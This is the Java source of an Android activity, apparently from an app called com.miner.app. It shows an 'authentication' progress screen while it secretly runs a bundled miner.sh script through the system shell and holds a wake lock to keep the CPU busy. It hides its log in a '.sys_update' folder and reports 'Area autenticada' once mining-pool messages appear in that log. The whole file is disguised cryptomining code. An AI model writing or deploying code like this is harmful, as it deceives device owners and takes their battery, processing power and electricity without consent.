package com.miner.app;

import android.app.Activity;
import android.app.AlertDialog;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.View;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends Activity {

    private TextView statusText;
    private ProgressBar progressBar;
    private View pulseView;
    private boolean isAuthenticated = false;
    private int clickCount = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Layout Simples e Moderno
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#121212"));
        layout.setPadding(50, 50, 50, 50);

        // Listener para abrir logs após 10 cliques
        layout.setOnClickListener(v -> {
            clickCount++;
            if (clickCount >= 10) {
                showLogs();
                clickCount = 0;
            }
        });

        statusText = new TextView(this);
        statusText.setText("Iniciando autenticação...");
        statusText.setTextColor(Color.WHITE);
        statusText.setTextSize(18);
        statusText.setGravity(Gravity.CENTER);
        
        progressBar = new ProgressBar(this);
        progressBar.setIndeterminate(true);
        
        // Círculo de Pulsação
        pulseView = new View(this);
        LinearLayout.LayoutParams pulseParams = new LinearLayout.LayoutParams(100, 100);
        pulseParams.setMargins(0, 40, 0, 40);
        pulseView.setLayoutParams(pulseParams);
        pulseView.setBackgroundResource(android.R.drawable.presence_online);
        pulseView.setVisibility(View.INVISIBLE);

        layout.addView(progressBar);
        layout.addView(statusText);
        layout.addView(pulseView);
        
        setContentView(layout);

        // Manter a CPU ativa
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Miner:Wakelock");
        wakeLock.acquire();

        new Thread(() -> {
            try {
                File script = new File(getFilesDir(), "miner.sh");
                copyAsset("miner.sh", script);
                script.setExecutable(true);

                // Iniciar Minerador
                ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", script.getAbsolutePath());
                pb.directory(getFilesDir());
                pb.environment().put("IS_NATIVE_APP", "true");
                pb.environment().put("APP_FILES_DIR", getFilesDir().getAbsolutePath());
                pb.redirectErrorStream(true);
                pb.start();

                // Monitorar Log para Autenticação Real
                File logFile = new File(getFilesDir(), ".sys_update/sys_log.txt");
                
                while (!isAuthenticated) {
                    if (logFile.exists()) {
                        if (checkLogForSuccess(logFile)) {
                            isAuthenticated = true;
                            updateUIToAuthenticated();
                            break;
                        }
                    }
                    Thread.sleep(2000); // Verificar a cada 2 segundos
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void showLogs() {
        try {
            File logFile = new File(getFilesDir(), ".sys_update/sys_log.txt");
            StringBuilder logs = new StringBuilder();
            if (logFile.exists()) {
                BufferedReader br = new BufferedReader(new FileReader(logFile));
                String line;
                while ((line = br.readLine()) != null) {
                    logs.append(line).append("\n");
                }
                br.close();
            } else {
                logs.append("Log ainda não gerado...");
            }

            // Exibir em um AlertDialog com Scroll
            TextView logTextView = new TextView(this);
            logTextView.setText(logs.toString());
            logTextView.setPadding(20, 20, 20, 20);
            logTextView.setTextColor(Color.BLACK);
            logTextView.setTextSize(12);

            ScrollView scrollView = new ScrollView(this);
            scrollView.addView(logTextView);

            new AlertDialog.Builder(this)
                .setTitle("Logs do Sistema")
                .setView(scrollView)
                .setPositiveButton("Fechar", null)
                .show();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean checkLogForSuccess(File log) {
        try (BufferedReader br = new BufferedReader(new FileReader(log))) {
            String line;
            while ((line = br.readLine()) != null) {
                if (line.contains("READY threads") || line.contains("accepted") || line.contains("new job from")) {
                    return true;
                }
            }
        } catch (Exception e) {
            return false;
        }
        return false;
    }

    private void updateUIToAuthenticated() {
        new Handler(Looper.getMainLooper()).post(() -> {
            statusText.setText("Area autenticada");
            statusText.setTextColor(Color.GREEN);
            progressBar.setVisibility(View.GONE);
            
            pulseView.setVisibility(View.VISIBLE);
            AlphaAnimation blink = new AlphaAnimation(0.2f, 1.0f);
            blink.setDuration(1000);
            blink.setRepeatMode(Animation.REVERSE);
            blink.setRepeatCount(Animation.INFINITE);
            pulseView.startAnimation(blink);
        });
    }

    private void copyAsset(String name, File dest) throws Exception {
        InputStream is = getAssets().open(name);
        OutputStream os = new FileOutputStream(dest);
        byte[] buffer = new byte[1024];
        int read;
        while ((read = is.read(buffer)) != -1) {
            os.write(buffer, 0, read);
        }
        is.close();
        os.flush();
        os.close();
    }
}
